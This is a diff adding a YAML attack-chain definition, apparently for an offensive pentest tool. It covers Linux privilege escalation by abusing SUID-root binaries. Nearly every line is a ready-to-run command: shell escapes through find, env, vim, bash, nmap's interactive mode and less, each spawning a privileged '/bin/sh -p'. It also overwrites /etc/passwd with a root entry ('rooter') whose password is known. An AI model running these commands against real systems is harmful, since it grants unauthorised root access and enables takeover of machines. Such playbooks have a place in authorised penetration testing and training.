@@ -1,0 +1,55 @@
+chain_id: suid_gtfobins
+title: "Linux privesc — SUID binary abuse via GTFOBins"
+severity: HIGH
+tags: [linux, privesc, suid, gtfobins]
+
+trigger:
+  any_of:
+    - { kind: "suid-binary" }
+
+description: |
+  At least one SUID-root binary was found. For each binary, look it up at
+  https://gtfobins.github.io/ → 'SUID' section. Below are the most common
+  one-shots that work without sudo (the binary itself is SUID-root).
+
+steps:
+  - id: 1
+    title: "find"
+    command: /usr/bin/find . -exec /bin/sh -p \; -quit
+
+  - id: 2
+    title: "nmap (legacy SUID with --interactive)"
+    command: /usr/bin/nmap --interactive
+    notes: |
+      Inside nmap's interactive prompt:
+        !sh
+
+  - id: 3
+    title: "vim.basic"
+    command: /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'
+
+  - id: 4
+    title: "bash itself (rare, but instant root)"
+    command: /usr/bin/bash -p
+
+  - id: 5
+    title: "cp (overwrite /etc/passwd with a known-pw root entry)"
+    command: |
+      openssl passwd -1 -salt salt rootpass
+      # produces $1$salt$xxxx — append: rooter:<hash>:0:0:root:/root:/bin/bash to passwd
+      /usr/bin/cp passwd /etc/passwd
+      su rooter
+
+  - id: 6
+    title: "env"
+    command: /usr/bin/env /bin/sh -p
+
+  - id: 7
+    title: "less / more / man / view"
+    command: /usr/bin/less /etc/profile
+    notes: |
+      Inside less, type:
+        !/bin/sh -p
+
+references:
+  - https://gtfobins.github.io/
